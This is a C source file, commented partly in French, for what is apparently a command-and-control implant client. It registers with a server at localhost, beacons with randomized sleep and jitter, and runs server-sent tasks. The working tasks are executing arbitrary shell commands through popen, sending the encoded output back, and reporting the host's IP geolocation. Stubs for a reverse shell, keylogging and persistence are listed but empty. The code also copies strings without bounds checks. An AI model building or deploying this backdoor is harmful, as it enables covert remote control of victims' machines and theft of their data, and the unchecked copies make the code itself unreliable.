#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include "base64.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080
#define BUFFER_SIZE 4096

char uid[64];
double sleep_time = 5;
double jitter = 0.0;

// Nouvelle fonction pour créer une connexion socket au serveur
int connect_to_server() {
    int sockfd;
    struct sockaddr_in servaddr;
    
    // Création du socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // Configuration de l'adresse du serveur
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    
    // Connexion au serveur
    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) != 0) {
        perror("Erreur lors de la connexion au serveur");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

// Fonction pour envoyer une commande au serveur et récupérer la réponse
int send_command_and_get_response(const char *command, char *response, size_t response_size) {
    int sockfd = connect_to_server();
    if (sockfd < 0) {
        return -1;
    }
    
    // Envoi de la commande
    if (send(sockfd, command, strlen(command), 0) < 0) {
        perror("Erreur lors de l'envoi de la commande");
        close(sockfd);
        return -1;
    }
    
    // Réception de la réponse
    int bytes_received = recv(sockfd, response, response_size - 1, 0);
    if (bytes_received < 0) {
        perror("Erreur lors de la réception de la réponse");
        close(sockfd);
        return -1;
    }
    
    // Ajout de la terminaison de chaîne
    response[bytes_received] = '\0';
    
    close(sockfd);
    return 0;
}

void get_uid() {
    char command[128] = "DECLARE,client,linux,terminal\n";
    char response[1024] = {0};
    
    if (send_command_and_get_response(command, response, sizeof(response)) < 0) {
        fprintf(stderr, "Erreur lors de la déclaration du client\n");
        return;
    }
    
    // expected format: "Ok, ad8895843b")
    strtok(response, ",");         // ignore the first field
    char *id = strtok(NULL, ",");
    
    // Trim trailing whitespace and newlines
    if (id != NULL) {
        char *end = id + strlen(id) - 1;
        while (end > id && (*end == ' ' || *end == '\n' || *end == '\r')) {
            *end = '\0';
            end--;
        }
    }
    
    strcpy(uid, id);
    
    printf("My UID: '%s'\n", uid);
}

void task_execve(char *command_str, char *argument_str, const char *id_task) {
    printf("Executing task execve\n");
    
    // decoding command and argument
    char *command = decode(command_str);
    char *argument = NULL;
    
    if (argument_str != NULL) {
        argument = decode(argument_str);
    }
    
    // string concatenation
    char full_command[4096] = {0};
    strcpy(full_command, command);
    
    if (argument != NULL) {
        strcat(full_command, " ");
        strcat(full_command, argument);
    }
    
    printf("Executing command: %s\n", full_command);
    
    // execute the command and capture output
    char result_buffer[4096] = {0};
    FILE *fp = popen(full_command, "r");
    
    // Read output
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strncat(result_buffer, buffer, sizeof(result_buffer) - strlen(result_buffer) - 1);
    }
    pclose(fp);
    
    // Send the result back to the server
    if (strlen(result_buffer) > 0) {
        // encoding and sending the result
        char *encoded_result = encode(result_buffer);
        char cmd[BUFFER_SIZE];
        char response[1024] = {0};
        
        // Format de commande : "RESULT,uid,id_task,encoded_result"
        snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
        printf("Sending result: %s\n", cmd);
        
        // Envoi via socket
        if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
            fprintf(stderr, "Erreur lors de l'envoi du résultat\n");
        } else {
            printf("Server response: %s\n", response);
        }
        
        free(encoded_result);
    } else {
        printf("No command output to send\n");
    }
    
    free(command);
    if (argument) free(argument);
}

void task_sleep(char *sleep_time_str, char *jitter_str) {
    printf("Executing task sleep\n");
    
    if (sleep_time_str != NULL) {
        char *decoded_sleep = decode(sleep_time_str);
        if (decoded_sleep != NULL) {
            sleep_time = atof(decoded_sleep);
            printf("New sleep time: %.2f seconds\n", sleep_time);
            free(decoded_sleep);
        }
    }

    if (jitter_str != NULL) {
        char *decoded_jitter = decode(jitter_str);
        if (decoded_jitter != NULL) {
            jitter = atof(decoded_jitter);
            printf("Jitter: %.2f%%\n", jitter);
            free(decoded_jitter);
        }
    }
    
    return;
}

void calculate_random_sleep_time() {
    double time_1 = sleep_time - (jitter/100.0 * sleep_time);
    double time_2 = sleep_time + (jitter/100.0 * sleep_time);
    
    // seeding random number generator
    srand(time(NULL));
    
    double random_factor = (double)rand() / RAND_MAX;
    sleep_time = time_1 + random_factor * (time_2 - time_1);
}

// Fonction de callback pour libcurl
size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata) {
    strcat((char*)userdata, ptr);
    return size * nmemb;
}

void task_locate(const char *id_task) {
    printf("Executing task locate\n");
    
    char result_buffer[4096] = {0};
    
    // Initialisation de curl
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Erreur d'initialisation de curl\n");
        return;
    }
    
    // Configuration de la requête
    curl_easy_setopt(curl, CURLOPT_URL, "https://ipinfo.io");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, result_buffer);
    
    // Exécution de la requête
    CURLcode res = curl_easy_perform(curl);
    
    // Nettoyage
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        fprintf(stderr, "Erreur curl: %s\n", curl_easy_strerror(res));
        return;
    }
    
    // Encodage et envoi du résultat
    char *encoded_result = encode(result_buffer);
    if (encoded_result == NULL) {
        printf("Error encoding to base64\n");
        return;
    }
    
    // Format de la commande : "RESULT,uid,id_task,encoded_result"
    char cmd[BUFFER_SIZE];
    char response[1024] = {0};
    
    snprintf(cmd, sizeof(cmd), "RESULT,%s,%s,%s\n", uid, id_task, encoded_result);
    printf("Command to send: %s\n", cmd);
    
    // Envoi via socket
    if (send_command_and_get_response(cmd, response, sizeof(response)) < 0) {
        fprintf(stderr, "Erreur lors de l'envoi du résultat de localisation\n");
    } else {
        printf("Server response: %s\n", response);
    }
    
    // Libération de la mémoire
    free(encoded_result);
}

void task_revshell() {
    printf("Executing task revshell\n");
    return;
}

void task_keylog() {
    printf("Executing task keylog\n");
    return;
}

void task_persist() {
    printf("Executing task persist\n");
    return;
}

void task_cat() {
    printf("Executing task cat\n");
    return;
}

void task_mv() {
    printf("Executing task mv\n");
    return;
}

void task_rm() {
    printf("Executing task rm\n");
    return;
}

void task_ps() {
    printf("Executing task ps\n");
    return;
}

void task_netstat() {
    printf("Executing task netstat\n");
    return;
}

void check_commands() {
    char cmd[128];
    char result[1024] = {0};
    
    // Format de la commande : "FETCH,uid"
    snprintf(cmd, sizeof(cmd), "FETCH,%s\n", uid);
    
    // Envoi via socket
    if (send_command_and_get_response(cmd, result, sizeof(result)) < 0) {
        fprintf(stderr, "Erreur lors de la récupération des commandes\n");
        return;
    }
    
    printf("Server response: %s\n", result);
    
    // Check if the server returns an error
    if (strncmp(result, "ERROR", 5) == 0) {
        printf("Error received from the server: %s\n", result);
        return;
    }
    
    // expected format : "type,id_task,command,argument")
    char *type = strtok(result, ",");
    
    if (type != NULL) {
        char *id_task = strtok(NULL, ",");
        if (strcmp(type, "EXECVE") == 0) {
            char *command = strtok(NULL, ",");
            char *argument = strtok(NULL, ",");  // Get the argument as well
            task_execve(command, argument, id_task);
        } else if (strcmp(type, "SLEEP") == 0) {
            char *sleep_time = strtok(NULL, ",");
            char *jitter = strtok(NULL, ",");
            task_sleep(sleep_time, jitter);
        } else if (strcmp(type, "LOCATE") == 0) {
            task_locate(id_task);
        } else if (strcmp(type, "REVSHELL") == 0) {
            task_revshell();
        } else if (strcmp(type, "KEYLOG") == 0) {
            task_keylog();
        } else if (strcmp(type, "PERSIST") == 0) {
            task_persist();
        } else if (strcmp(type, "CAT") == 0) {
            task_cat();
        } else if (strcmp(type, "MV") == 0) {
            task_mv();
        } else if (strcmp(type, "RM") == 0) {
            task_rm();
        } else if (strcmp(type, "PS") == 0) {
            task_ps();
        } else if (strcmp(type, "NETSTAT") == 0) {
            task_netstat();
        } else {
            printf("Unknown or unsupported type: %s\n", type);
        }
    } else {
        printf("Malformed or empty response.\n");
    }
}

int main() {
    // Initialize the decoding table
    build_decoding_table();
    
    // Initialize curl at program start
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // step 1 : get uid
    get_uid();
    
    while (1) {
        // step 2 : check tasks
        printf("\nChecking commands...\n");
        check_commands();
        
        // step 3 : sleep
        calculate_random_sleep_time();
        
        printf("Pause of %.2f seconds\n", sleep_time);
        sleep(sleep_time);
    }
    
    // Clean up curl resources
    curl_global_cleanup();
    
    // cleaning
    base64_cleanup();
    return 0;
}